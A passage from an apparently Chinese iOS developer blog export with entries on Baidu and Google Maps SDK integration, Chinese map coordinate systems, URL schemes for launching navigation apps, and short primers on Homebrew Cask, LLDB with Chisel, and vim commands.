return nil;&#125;// 百度反地理编码解析地址回调，需要重新刷新大头针的气泡模型数据- (void)onGetReverseGeoCodeResult:(BMKGeoCodeSearch *)searcher result:(BMKReverseGeoCodeResult *)result errorCode:(BMKSearchErrorCode)error&#123; XSLog(@&quot;address:%@----%@&quot;, result.addressDetail, result.address); self.locationDetails.deviceAddress = result.address; self.petAnnotationView.locationDetails = self.locationDetails;&#125; 4、多个坐标线显示在屏幕范围内 绘制多个轨迹点和绘制线比较简单，直接参考官方文档 在历史轨迹界面，可能希望显示的所有轨迹点都在屏幕范围内 123456789101112131415161718192021222324252627282930313233343536373839404142- (void)baiduMapViewFitAnnotationsWithCoordinates:(CLLocationCoordinate2D *)coords count:(NSUInteger)count&#123; NSMutableArray *latArr = [[NSMutableArray alloc] init]; NSMutableArray *lonArr = [[NSMutableArray alloc] init]; for (XSLocationDetails *locationDetails in coordsModels) &#123; [latArr addObject:@(locationDetails.coordinateBD09ll.latitude)]; [lonArr addObject:@(locationDetails.coordinateBD09ll.longitude)]; &#125; NSNumber *latMax = [latArr valueForKeyPath:@&quot;@max.floatValue&quot;];//最大纬度 NSNumber *latMin = [latArr valueForKeyPath:@&quot;@min.floatValue&quot;];//最小纬度 NSNumber *lonMax = [lonArr valueForKeyPath:@&quot;@max.floatValue&quot;];//最大经度 NSNumber *lonMin = [lonArr valueForKeyPath:@&quot;@min.floatValue&quot;];//最小经度 BMKCoordinateRegion region; region.center.latitude = ([latMax doubleValue] + [latMin doubleValue]) / 2; region.center.longitude = ([lonMax doubleValue] + [lonMin doubleValue]) / 2; region.span.latitudeDelta = 0.0055; // 数字越小 缩放等级越大 region.span.longitudeDelta = 0.0055; region = [self.baiduMapView regionThatFits:region]; [self.baiduMapView setRegion:region animated:YES]; // if (count &lt; 2) return;// CLLocationCoordinate2D coor = [coordsModels.firstObject coordinateBD09ll];// BMKMapPoint pt = BMKMapPointForCoordinate(coor);// CGFloat ltX, ltY, rbX, rbY;// ltX = pt.x, ltY = pt.y;// rbX = pt.x, rbY = pt.y;//// for (int i = 1; i &lt; count; i++) &#123;// CLLocationCoordinate2D coor = [coordsModels[i] coordinateBD09ll];// BMKMapPoint pt = BMKMapPointForCoordinate(coor);// if (pt.x &lt; ltX) ltX = pt.x;// if (pt.x &gt; rbX) rbX = pt.x;// if (pt.y &gt; ltY) ltY = pt.y;// if (pt.y &lt; rbY) rbY = pt.y;// &#125;// BMKMapRect rect;// rect.origin = BMKMapPointMake(ltX , ltY);// rect.size = BMKMapSizeMake(rbX - ltX, rbY - ltY);// [self.baiduMapView setVisibleMapRect:rect];// self.baiduMapView.zoomLevel = self.baiduMapView.zoomLevel - 0.3;&#125; 谷歌地图1、注册地图api key12// 在程序启动代理方法注册google map api key 谷歌开发者平台获取[GMSServices provideAPIKey:kGoogleMapApiKey]; 2、初始化地图123456789101112- (void)setupGoogleMapView&#123; GMSCameraPosition *camera = [GMSCameraPosition cameraWithLatitude:0 longitude:0 zoom:kMapsZoomLevel]; GMSMapView *mapView = [GMSMapView mapWithFrame:CGRectMake(0, 0, XSScreenW, XSScreenH) camera:camera]; mapView.delegate = self; mapView.myLocationEnabled = YES; [mapView setMinZoom:kMapsMinZoomLevel maxZoom:kMapsMaxZoomLevel]; mapView.settings.compassButton = YES; mapView.settings.consumesGesturesInView = NO; [self.view insertSubview:mapView atIndex:0]; self.googleMapView = mapView;&#125; 3、显示自定义大头针 3.1、从服务器获取当前设备的相关信息转为模型数据(XSDeviceLocation *locationDetails) 3.2、根据当前显示的地图类型设置对应的坐标信息大头针 我的做法在XSDeviceLocation模型里面提供了对应地图的获取属性，在属性getter方法中进行服务器的坐标转换(处理国内返回火星坐标、国外返回标准坐标) 如获取百度坐标locationCoordinateBaidu、获取谷歌坐标locationCoordinateGoogle 根据类型设置坐标数据 123456- (void)setupPetLocationCoordinate:(CLLocationCoordinate2D)coordinate mapType:(XSDisplayMapType)mapType&#123; // 坐标过滤等其他操作 // ... [self setupGoogleMapCoordinate:coordinate];&#125; 3.3、根据设备坐标的相关配置 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364- (void)setupGoogleMapCoordinate:(CLLocationCoordinate2D)coordinate&#123; [self.googleMapView animateToLocation:coordinate]; // Creates a marker in the center of the map. self.marker.markerType = XSMarkerTypeDefaultLocation; self.marker.position = coordinate; self.marker.appearAnimation = YES; self.marker.tracksInfoWindowChanges = YES; self.marker.icon = [UIImage imageNamed:self.locationDetails.deviceBindingTypeImageName]; self.marker.map = self.googleMapView; self.marker.locationDetailsModel = self.locationDetails; // 传递模型数据 // 点击大头针显示的自定义气泡控件 懒加载 self.petAnnotationView.locationDetails = self.locationDetails; self.petAnnotationView.isHiddenNoNeeds = NO; [[GMSGeocoder geocoder] reverseGeocodeCoordinate:coordinate completionHandler:^(GMSReverseGeocodeResponse * _Nullable response, NSError * _Nullable error) &#123; //FIXME: 错误信息处理 // 获取第一个位置信息 GMSAddress *addressModel = response.firstResult; NSString *firstString = addressModel.lines.firstObject; NSString *lastString = addressModel.lines.lastObject; NSString *address = [NSString stringWithFormat:@&quot;%@, %@&quot;, firstString, lastString]; self.locationDetails.deviceAddress = address; self.marker.locationDetailsModel = self.locationDetails; // 传递模型数据 self.petAnnotationView.locationDetails = self.locationDetails; &#125;]; // 添加精度圈 self.googleAccuracycircle.map = nil; // 清空已存在的 if (self.locationDetails.GpsType == XSLocationModeWifiAndLbs) &#123; // wifi 显示精度圈 self.googleAccuracycircle = [GMSCircle circleWithPosition:coordinate radius:self.locationDetails.Radius]; self.googleAccuracycircle.fillColor = [[UIColor colorWithHexString:kAccuracyCircleWifiAndLbsFillColor] colorWithAlphaComponent:0.15]; self.googleAccuracycircle.strokeColor = [[UIColor colorWithHexString:kAccuracyCircleWifiAndLbsStrokeColor] colorWithAlphaComponent:0.15]; self.googleAccuracycircle.strokeWidth = 1; self.googleAccuracycircle.map = self.googleMapView; &#125; else if (self.locationDetails.GpsType == XSLocationModeLbs) &#123; self.googleAccuracycircle = [GMSCircle circleWithPosition:coordinate radius:self.locationDetails.Radius]; self.googleAccuracycircle.fillColor = [[UIColor colorWithHexString:kAccuracyCircleLbsFillColor] colorWithAlphaComponent:0.15]; self.googleAccuracycircle.strokeColor = [[UIColor colorWithHexString:kAccuracyCircleLbsStrokeColor] colorWithAlphaComponent:0.15]; self.googleAccuracycircle.strokeWidth = 1; self.googleAccuracycircle.map = self.googleMapView; &#125; // 计算地图区域缩放 CLLocationDistance horizontalScreenDistance = [self horizontalScreenDistance]; if (self.locationDetails.Radius * 2 &lt; horizontalScreenDistance || self.googleMapView.camera.zoom &lt;= kMapsMinZoomLevel) &#123; return; &#125; int zoomLevel = self.googleMapView.camera.zoom;// double radius = self.locationDetails.Radius + self.locationDetails.Radius / 2; double radius = self.locationDetails.Radius / 2; double scale = radius / 500; zoomLevel = (int) (16 - log(scale) / log(2)); zoomLevel--; [CATransaction begin]; [CATransaction setValue:[NSNumber numberWithFloat:XSAnimationDuration] forKey:kCATransactionAnimationDuration]; GMSCameraPosition *camera = [GMSCameraPosition cameraWithLatitude:coordinate.latitude longitude:coordinate.longitude zoom:zoomLevel]; [self.googleMapView animateToCameraPosition:camera]; [CATransaction commit];&#125; 自定义大头针模型XSMarker继承自GMSMarker 扩充两个属性： markerType ：枚举，显示的大头针类型（切换图标） locationDetailsModel ：当前大头针的模型数据，点击显示气泡详情的数据 添加精度圈后精度半径过大可能超出屏幕影响用户体验，解决方法如下： 根据屏幕最左和最后两个点，转换出地图上对应的坐标点并计算出距离d 根据当前精度圈半径 * 2 和 d 比较，如果超出屏幕就重新设置地图显示区域 计算屏幕距离核心代码 123CLLocationCoordinate2D leftCoor = [self.googleMapView.projection coordinateForPoint:CGPointMake(0, XSScreenH)];CLLocationCoordinate2D rightCoor = [self.googleMapView.projection coordinateForPoint:CGPointMake(XSScreenW, XSScreenH)];return GMSGeometryDistance(leftCoor, rightCoor); 3.4、点击大头针显示气泡view的回调 1234567- (UIView *)mapView:(GMSMapView *)mapView markerInfoWindow:(GMSMarker *)marker&#123; XSLogFunc self.petAnnotationView.width = 270; self.petAnnotationView.locationDetails = self.locationDetails; // 刷新显示的信息 return self.petAnnotationView;&#125; 4、多个坐标线显示在屏幕范围内 绘制多个轨迹点和绘制线比较简单，直接参考官方文档 在历史轨迹界面，可能希望显示的所有轨迹点都在屏幕范围内 123456789- (void)googleMapViewFitAnnotationsWithCoordinates:(NSArray *)coordsModels count:(NSUInteger)count&#123; GMSCoordinateBounds *bounds = [[GMSCoordinateBounds alloc] init]; for (int i = 1; i &lt; count; i++) &#123; CLLocationCoordinate2D coor = [coordsModels[i] locationCoordinate2D]; bounds = [bounds includingCoordinate:coor]; &#125; [self.googleMapView animateWithCameraUpdate:[GMSCameraUpdate fitBounds:bounds withPadding:30.0f]];&#125; Maps 导航 检测是否安装对应的地图 常用的4个地图的 URL Scheme: 1.苹果自带地图（不需要检测，所以不需要URL Scheme）2.百度地图 ：baidumap://3.高德地图 ：iosamap://4.谷歌地图 ：comgooglemaps:// 在IOS9之后，苹果进一步完善了安全机制，必须在plist里面设置url scheme白名单，不然无法打开对应的应用 添加白名单： 在 info.plist 文件里面，添加一个字段：LSApplicationQueriesSchemes，类型为数组 然后在这个数组里面再添加我们所需要的地图 URL Scheme : 1234&gt; baidumap // 百度&gt; iosamap // 高德&gt; comgooglemaps // 谷歌&gt; 应用内部调用google maps地图发起导航功能 1、x-source=%@&amp;x-success=%@跟高德一样 这里分别代表APP的名称和URL Scheme 2、saddr=这里留空则表示从当前位置触发。 1234567if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@&quot;comgooglemaps://&quot;]]) &#123; NSMutableDictionary *googleMapDic = [NSMutableDictionary dictionary]; googleMapDic[@&quot;title&quot;] = @&quot;谷歌地图&quot;; NSString *urlString = [[NSString stringWithFormat:@&quot;comgooglemaps://?x-source=%@&amp;x-success=%@&amp;saddr=&amp;daddr=%f,%f&amp;directionsmode=driving&quot;,@&quot;导航测试&quot;,@&quot;nav123456&quot;,endLocation.latitude, endLocation.longitude] stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]; googleMapDic[@&quot;url&quot;] = urlString; [maps addObject:googleMapDic];&#125; 应用内部调用百度地图发起导航功能 1，origin=, 这个是不能被修改的，不然无法把出发位置设置为当前位置 2，destination = latlng:%f,%f|name = 目的地这里面的 name 的字段不能省略，否则导航会失败，而后面的文字则可以随意，赋个你的目的地的值给他就可以了。 3，coord_type = gcj02coord_type 允许的值为 bd09ll、gcj02、wgs84，如果你 APP 的地图 SDK 用的是百度地图 SDK，请填 bd09ll，否则就填gcj02，wgs84的话基本是用不上了 1234567if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@&quot;baidumap://&quot;]]) &#123; NSMutableDictionary *baiduMapDic = [NSMutableDictionary dictionary]; baiduMapDic[@&quot;title&quot;] = @&quot;百度地图&quot;; NSString *urlString = [[NSString stringWithFormat:@&quot;baidumap://map/direction?origin=&#123;&#123;我的位置&#125;&#125;&amp;destination=latlng:%f,%f|name=北京&amp;mode=driving&amp;coord_type=gcj02&quot;,endLocation.latitude,endLocation.longitude] stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]; baiduMapDic[@&quot;url&quot;] = urlString; [maps addObject:baiduMapDic];&#125; 应用内部调用高德地图发起导航功能 1、sourceApplication=%@&amp;backScheme=%@sourceApplication代表你自己APP的名称 会在之后跳回的时候显示出来 所以必须填写 backScheme是你APP的URL Scheme 不填是跳不回来的哟 2、dev=0这里填0就行了，跟上面的gcj02一个意思 1代表wgs84 也用不上 1234567if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@&quot;iosamap://&quot;]]) &#123; NSMutableDictionary *gaodeMapDic = [NSMutableDictionary dictionary]; gaodeMapDic[@&quot;title&quot;] = @&quot;高德地图&quot;; NSString *urlString = [[NSString stringWithFormat:@&quot;iosamap://navi?sourceApplication=%@&amp;backScheme=%@&amp;lat=%f&amp;lon=%f&amp;dev=0&amp;style=2&quot;,@&quot;导航功能&quot;,@&quot;nav123456&quot;,endLocation.latitude,endLocation.longitude] stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]; gaodeMapDic[@&quot;url&quot;] = urlString; [maps addObject:gaodeMapDic];&#125; 应用内部调用苹果地图发起导航功能 123456CLLocationCoordinate2D loc = CLLocationCoordinate2DMake([self.model.latitude floatValue], [self.model.longitude floatValue]);MKMapItem *currentLocation = [MKMapItem mapItemForCurrentLocation];MKMapItem *toLocation = [[MKMapItem alloc] initWithPlacemark:[[MKPlacemark alloc] initWithCoordinate:loc addressDictionary:nil]];[MKMapItem openMapsWithItems:@[currentLocation, toLocation]launchOptions:@&#123;MKLaunchOptionsDirectionsModeKey: MKLaunchOptionsDirectionsModeDriving,MKLaunchOptionsShowsTrafficKey: [NSNumber numberWithBool:YES]&#125;];]]></content>
      <categories>
        <category>iOS</category>
        <category>地图</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>地图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之地图篇(一)]]></title>
    <url>%2Farchives%2F1c8732fb.html</url>
    <content type="text"><![CDATA[赵客缦胡缨，吴钩霜雪明。银鞍照白马，飒沓如流星。十步杀一人，千里不留行。事了拂衣去，深藏身与名。 地图坐标体系1.WGS－84原始坐标系 一般用国际GPS纪录仪记录下来的经纬度 通过GPS定位拿到的原始经纬度 Google（国外）、高德地图（国外）、OSM地图定位的的经纬度。 但是在国内是不允许直接用WGS84坐标系标注的，必须经过加密后才能使用 注意：国内不允许直接使用，但是GPS设备上传的数据还是标准的数据，国内使用需要转为GCJ－02坐标 2.GCJ－02坐标系 GCJ－02坐标系又名“火星坐标系”，是我国国测局独创的坐标体系，由WGS－84加密而成。 在国内，必须至少使用GCJ－02坐标系，如高德和Google在国内。 或者使用在GCJ－02加密后再进行加密的坐标系，如百度坐标系。 3.百度坐标系:bd-09 百度坐标系是在GCJ－02坐标系的基础上再次加密偏移后形成的坐标系，只适用于百度地图。 国内地图偏移问题 地图偏移问题一般只有在国内才会出现 国内‘标准’GPS设备定位坐标为GCJ－02坐标系，显示地图为偏移过的地图，最终显示的为准确的位置国内非’标准’的设备定位坐标为WGS－84原始坐标系，显示地图为偏移过的地图，最终显示的位置出现偏移 Google MapsGoogle Maps注意点 自定义弹窗可以直接使用InfoWindow 调整地图上面的图标位置 没办法可以直接调整每一个图标的位置 可以设置地图的内容padding属性来调整 但是padding属性设置局限于调整和屏幕边缘的距离 刷新地图弹框内容可以设置自动刷新帧的间隔（对应有的不需要变化的控件可以关闭以节约性能） 添加手势会和地图的手势冲突，需要设置地图的consumesGesturesInView为false consumesGesturesInView手势控制是否用户设置的手势被谷歌地图接管处理默认设置为YES 定位点的自定义弹框 每一个定位点对象GMSMarker 如果想要自定义弹框可以在下面方法实现 (UIView *)mapView:(GMSMapView *)mapView markerInfoWindow:(GMSMarker *)marker 如果想要刷新地图弹框的内容, 需要在设置Marker的方法里直接转换坐标，并且实时位置的自定义弹框需要全局是一个控件，否则无法刷新控件 markerInfoWindow：方法只需要初始化控件即可，在获取到数据设置GMSMarker的方法里传递数据 想要刷新数据要设置 tracksInfoWindowChanges = YES 在国内直接使用GPS原始坐标显示在地图上面会有偏移 可以使用网上别人c语言写的一些纠偏算法，纠偏后偏移不是很大（纠偏只针对国内，可以使用经纬度区分国内还是国外的区域，不是非常准确） 高德地图和百度地图SDK里面有提供国内外区域判断的Api，提供一个坐标点判断是在国内还是在国外 Google Maps 收费The Google Maps Geolocation API 普通用户 每天可以调用2500次，每秒调用50次 超过后按每1000次/0.5美元收费（还是有调用限制：每天上限:100000次） 高级用户 高级用户需要和Google公司联系，可以按协议付费提高调用次数限制 但是只能针对国外的公司（不对国内公司提供服务），账单付费也必须是国外的公司 解决方法 （调用高德服务） 高德地图针对没有开发对应的iOS和Android的客户端的智能硬件产品的企业用户, 提供智能硬件定位服务，支持通过服务端上传WIFI和基站信息进行定位并获取经纬度。 需要开发者账号注册为企业用户 免费调用限制为3000000次/每天 同Google Maps Geolocation API 将设备GPS获取到的Wifi和Lb数据或者Cell Tower数据转换为对应的经纬度信息 高德转出来的为GCJ－02坐标体系（火星坐标） 有国外的数据支持，但是具体的精准的还需要再测试 地图坐标体系转换 地图的SDK一般会提供其他地图坐标体系到自身体系的转换接口 但是 均不提供从自身向其他坐标体系转换 google SDK没有坐标转换接口 别人写的转换方法、有误差 https://github.com/JackZhouCn/JZLocationConverter 别人写的服务器（C#版）坐标转换 https://www.jianshu.com/p/8975586a820e]]></content>
      <categories>
        <category>iOS</category>
        <category>地图</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>地图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Homebrew介绍]]></title>
    <url>%2Farchives%2F4f2aa8f3.html</url>
    <content type="text"><![CDATA[Homebrew 安装及使用和常用的扩展。 iOS开发工具之Homebrew篇Homebrew官网 https://brew.sh/index_zh-cn.htmlHomebrew 是基于 OS X 的套件管理工具，是一个开源的 Ruby 脚本，专门用于快速下载软件 Homebrew 类似于一个软件中心，可以理解成 App Store 或者 Google Play 那样的软件商店, 且内容更加丰富; Homebrew Cask，它是一套建立在 Homebrew 基础之上的 OS X 软件安装命令行工具，是 Homebrew 的扩展;使用Homebrew有什么优势呢? 通过 Homebrew 下载安装的软件全部来自对应的软件官网，无需担心下载源的安全问题; 依存于系统既有的库，减少了空间占用和冗余; 使用 Git 进行管理和更新; 易于定制; Homebrew 使用： 安装软件 brew cask install 软件名 1brew cask install google-chrome 卸载软件 brew cask uninstall 软件名 1brew cask uninstall google-chrome 软件搜索 brew cask search 软件名 1brew cask search google 查看软件相关信息 brew cask info 软件名 1brew cask info google-chrome 删除 Homebrew Cask 下载的包 1brew cask cleanup 列出通过 Homebrew Cask 安装的包 1brew cask list 更新 Homebrew Cask 1brew cask update Homebrew 安装QuickLook常用的插件QuickLook插件http://www.quicklookplugins.com/ brew cask install qlmarkdown // 预览Markdown QLColorCode // 代码块高亮 QuickLook-JSON // JSON 文件 QLPrettyPatch // Patch 文件 qlvideo // 视频预览 QLStephen // 预览无拓展名的纯文本文件 BetterZipQL // 查看 Zip 压缩文件的信息以及文件目录 QLImageSize // 预览窗口的标题栏中显示图片分辨率及文件大小，并在 Finder 中显示图片的格式; 还支持 bpg、Portable Pixmap、WebP 格式 QuickLook-CSV // 预览 CSV 文件 qladdict // .srt (Subtitle)]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Homebrew</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LLDB介绍]]></title>
    <url>%2Farchives%2Fc9e6c86c.html</url>
    <content type="text"><![CDATA[LLDB 入门介绍及Chisel安装使用。 iOS开发工具之LLDB介篇 LLDB 是一个有着 REPL 的特性和 C++ ,Python 插件的开源调试器。LLDB 绑定在 Xcode 内部，存在于主窗口底部的控制台中。 安装Chisel Facebook 开源的 lldb 插件 Chisel. 1、Chisel 使用 homebrew 来安装，如果你没有安装homebrew 12brew updatebrew install chisel 2、安装完成按照安装日志上的提示，在~/.lldbinit文件中添加一行，没有则新建。 提示类似如下： 123==&gt; CaveatsAdd the following line to ~/.lldbinit to load chisel when Xcode launches:command script import /usr/local/opt/chisel/libexec/fblldb.py 3、然后重启Xcode 常用的调试指令pjson 打印json格式数据，调试服务器返回数据时候用。 p/x 打印16进制数据 p/t 打印2进制数据 e 修改属性和调用方法 pviews 这个命令可以递归打印所有的view，并能标示层级，相当于 UIView 的私有辅助方法 [view recursiveDescription]。 善用使用这个功能会让你在调试定位问题时省去很多麻烦。 pvc 个命令也是递归打印层级，但是不是view，而是viewController。利用它我们可以对viewController的结构一目了然。 其实苹果在IOS8也默默的添加了 UIViewController 的一个私有辅助方法 [UIViewController _printHierarchy]同样的效果。 visualize 这是个很有意思的功能，它可以让你使用Mac的预览打开一个 UIImage, CGImageRef, UIView, 或 CALayer。 这个功能或许可以帮我们用来截图、用来定位一个view的具体内容。 但是在我试用了一下，发现暂时还是只能在模拟器时使用，真机还不行。 fv &amp; fvc fv和 fvc这两个命令是用来通过类名搜索当前内存中存在的view和viewController实例的命令，支持正则搜索。 show &amp; hide 这两个命令用来显示和隐藏一个指定的 UIView . 你甚至不需要Continue Progress. 就可以看到效果。 mask/umask border/unborder 这两组命令用来标识一个view或layer的位置时用， mask用来在view上覆盖一个半透明的矩形， border可以给view添加边框。但是在我实际使用的过程中mask总是会报错，估计是有bug， 那么mask/unmask 一般不要用好了，用border命令是一样的效果，反正二者的用途都是找到一个对应的view. caflush 这个命令会重新渲染，即可以重新绘制界面， 相当于执行了 [CATransaction flush] 方法，要注意如果在动画过程中执行这个命令，就直接渲染出动画结束的效果。 当你想在调试界面颜色、坐标之类的时候，可以直接在控制台修改属性，然后caflush就可以看到效果啦，是不是要比改代码，然后重新build省事多了呢。 bmessage 这个命令就是用来打断点用的了，虽然大家断点可能都喜欢在图形界面里面打，但是考虑一种情况：我们想在[MyViewController viewWillAppear:] 里面打断点，但是 MyViewController并没有实现 viewWillAppear:方法， 以往的作法可能就是在子类中实现下viewWillAppear:，然后打断点，然后rebuild。 那么幸好有了 bmessage命令。我们可以不用这样就可以打这个效果的断点： (lldb) bmessage -[MyViewController viewWillAppear:]上面命令会在其父类的 viewWillAppear: 方法中打断点，并添加上了条件：[self isKindOfClass:[MyViewController class]] help 可以用帮助文档查看所有的指令或者单个指令的使用方法 常用的Debug快捷键1234567891011121314151617cmd + ctrl + Y // 暂停/继续cmd + Y // 断点失效/生效cmd + shift + Y // 控制台显示/隐藏cmd + shift + C // 光标切换到控制台cmd + K // 清空控制台continue \(c\) // 继续执行step over F6 （n） // 单步执行step into F7（s） // 跳入step out F8 （finish）// 跳出]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>LLDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VIM介绍]]></title>
    <url>%2Farchives%2F1c40fe4d.html</url>
    <content type="text"><![CDATA[VIM 日常使用及注意点。 iOS开发工具之VIM篇VIM相关的指令 vi编辑器是所有Unix及Linux系统下标准的编辑器，它的强大不逊色于任何最新的文本编辑器，这里只是简单地介绍一下它的用法和一小部分指令。 由于对Unix及Linux系统的任何版本，vi编辑器是完全相同的，因此您可以在其他任何介绍vi的地方进一步了解它。Vi也是Linux中最基本的文本编辑器，学会它后，您将在Linux的世界里畅行无阻。 打开12345vim 直接启动vimvim filename 打开vim并创建名为filename的文件 // 打开单个文件vim file1 file2 file3 … // 打开多个文件:open file // 在vim窗口中打开一个新文件:split file // 在新窗口中打开文件 退出指令12345678:w 保存文件但不退出vi:w file 将修改另外保存到file中，不退出vi:w! 强制保存，不推出vi:wq 保存文件并退出vi:wq! 强制保存文件，并退出vi:q 不保存文件，退出vi:q! 不保存文件，强制退出vi:e! 放弃所有修改，从上次保存文件开始再编辑命令历史 1、vi的基本概念 基本上vi可以分为三种状态，分别是命令模式（command mode）、插入模式（Insertmode）和底行模式（last line mode），各模式的功能区分如下： 1) 命令行模式(command mode） 控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到 last line mode。 2) 插入模式（Insert mode） 只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。 3) 底行模式（last line mode） 将文件保存或退出vi，也可以设置编辑环境，如寻找字符串、列出行号……等。 不过一般我们在使用时把vi简化成两个模式，就是将底行模式（last line mode）也算入命令行模式command mode）。 2、vi的基本操作 a) 进入vi 在系统提示符号输入vi及文件名称后，就进入vi全屏幕编辑画面： 1$ vi myfile 不过有一点要特别注意，就是您进入vi之后，是处于「命令行模式（command mode）」，您要切换到「插入模式（Insert mode）」才能够输入文字。初次使用vi的人都会想先用上下左右键移动光标，结果电脑一直哔哔叫，把自己气个半死，所以进入vi后，先不要乱动，转换到「插入模式（Insert mode）」再说吧！ b) 切换至插入模式（Insert mode）编辑文件 在「命令行模式（command mode）」下按一下字母「i」就可以进入「插入模式（Insert mode）」，这时候你就可以开始输入文字了。 c) Insert 的切换 您目前处于「插入模式（Insert mode）」，您就只能一直输入文字，如果您发现输错了字！想用光标键往回移动，将该字删除，就要先按一下「ESC」键转到「命令行模式（command mode）」再删除文字 d) 退出vi及保存文件 在「命令行模式（command mode）」下，按一下「：」冒号键进入「Last line mode」，例如： 12345: w filename // （输入 「w filename」将文章以指定的文件名filename保存）: wq // (输入「wq」，存盘并退出vi): q! // (输入q!， 不存盘强制退出vi) 3、命令行模式（command mode）功能键 1）. 插入模式 按「i」切换进入插入模式「insert mode」，按“i”进入插入模式后是从光标当前位置开始输入文件； 按「a」进入插入模式后，是从目前光标所在位置的下一个位置开始输入文字； 按「o」进入插入模式后，是插入新的一行，从行首开始输入文字。 2）. 从插入模式切换为命令行模式 按「ESC」键。 3）. 移动光标 vi可以直接用键盘上的光标来上下左右移动，但正规的vi是用小写英文字母「h」、「j」、「k」、「l」，分别控制光标左、下、上、右移一格。 按「ctrl」+「b」：屏幕往“后”移动一页。 按「ctrl」+「f」：屏幕往“前”移动一页。 按「ctrl」+「u」：屏幕往“后”移动半页。 按「ctrl」+「d」：屏幕往“前”移动半页。 按数字「0」：移到文章的开头。 按「G」：移动到文章的最后。 按「$」：移动到光标所在行的“行尾”。 按「^」：移动到光标所在行的“行首” 按「w」：光标跳到下个字的开头 按「e」：光标跳到下个字的字尾 按「b」：光标回到上个字的开头 按「#l」：光标移到该行的第#个位置，如：5l,56l 4）. 删除文字 「x」：每按一次，删除光标所在位置的“后面”一个字符 「#x」：例如，「6x」表示删除光标所在位置的“后面”6个字符 「X」：大写的X，每按一次，删除光标所在位置的“前面”一个字符 「#X」：例如，「20X」表示删除光标所在位置的“前面”20个字符 「dd」：删除光标所在行 「#dd」：从光标所在行开始删除#行 5）. 复制 「yw」：将光标所在之处到字尾的字符复制到缓冲区中 「#yw」：复制#个字到缓冲区 「yy」：复制光标所在行到缓冲区 「#yy」：例如，「6yy」表示拷贝从光标所在的该行“往下数”6行文字 「p」：将缓冲区内的字符贴到光标所在位置。注意：所有与“y”有关的复制命令都必须与“p”配合才能完成复制与粘贴功能 6）. 替换 「r」：替换光标所在处的字符 「R」：替换光标所到之处的字符，直到按下「ESC」键为止 7）. 回复上一次操作 「u」：如果您误执行一个命令，可以马上按下「u」，回到上一个操作 、按多次“u”可以执行多次回复 8）. 更改 「cw」：更改光标所在处的字到字尾处 「c#w」：例如，「c3w」表示更改3个字 9）. 跳至指定的行 「ctrl」+「g」列出光标所在行的行号 「#G」：例如，「15G」，表示移动光标至文章的第15行行首 4、Last line mode下命令简介 在使用「last line mode」之前，请记住先按「ESC」键确定您已经处于「command mode」下后，再按「：」冒号即可进入「last line mode」 A) 列出行号 「set nu」：输入「set nu」后，会在文件中的每一行前面列出行号 B) 跳到文件中的某一行 「#」：「#」号表示一个数字，在冒号后输入一个数字，再按回车键就会跳到该行了，如输入数字15，再回车，就会跳到文章的第15行 C) 查找字符 「/关键字」：先按「/」键，再输入您想寻找的字符，如果第一次找的关键字不是您想要的，可以一直按「n」会往后寻找到您要的关键字为止 「?关键字」：先按「?」键，再输入您想寻找的字符，如果第一次找的关键字不是您想要的，可以一直按「n」会往前寻找到您要的关键字为止 D) 保存文件 「w」：在冒号输入字母「w」就可以将文件保存起来 E) 离开vi 「q」：按「q」就是退出，如果无法离开vi，可以在「q」后跟一个「!」强制离开vi 「qw」：一般建议离开时，搭配「w」一起使用，这样在退出的时候还可以保存文件 5、vi命令列表 1、下表列出命令模式下的一些键的功能： 123456789101112131415161718192021222324252627282930h 左移光标一个字符h 左移光标一个字符k 光标上移一行j 光标下移一行^ 光标移动至行首0 数字“0”，光标移至文章的开头G 光标移至文章的最后$ 光标移动至行尾Ctrl+f 向前翻屏Ctrl+b 向后翻屏Ctrl+d 向前翻半屏Ctrl+u 向后翻半屏i 在光标位置前插入字符a 在光标所在位置的后一个字符开始增加o 插入新的一行，从行首开始输入ESC 从输入状态退至命令状态x 删除光标后面的字符#x 删除光标后的＃个字符X (大写X) 删除光标前面的字符#X 删除光标前面的#个字符dd 删除光标所在的行#dd 删除从光标所在行数的#行yw 复制光标所在位置的一个字# yw复制光标所在位置的#个字yy 复制光标所在位置的一行#yy 复制从光标所在行数的#行p 粘贴u 取消操作cw 更改光标所在位置的一个字#cw 更改光标所在位置的#个字 2、下表列出行命令模式下的一些指令 123456w filename 储存正在编辑的文件为filenamewq filename 储存正在编辑的文件为filename，并退出viq! 放弃所有修改，退出viset nu 显示行号/或? 查找，在/后输入要查找的内容n 与/或?一起使用，如果查找的内容不是想要找的关键字，按n或向后（与/联用）或向前（与?联用）继续查找，直到找到为止 对于第一次用vi，有几点注意要提醒一下： 1、用vi打开文件后，是处于「命令行模式（command mode）」，您要切换到「插入模式（Insert mode）」才能够输入文字。 切换放方法：在「命令行模式（command mode）」下按一下字母「i」就可以进入「插入模式（Insert mode）」，这时候你就可以开始输入文字了 2、编辑好后，需从插入模式切换为命令行模式才能对文件进行保存，切换方法：按「ESC」键 3、保存并退出文件：在命令模式下输入:wq即可！（别忘了wq前面的:）]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>VIM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发多Target（二）：复制Target]]></title>
    <url>%2Farchives%2F9c6697bb.html</url>
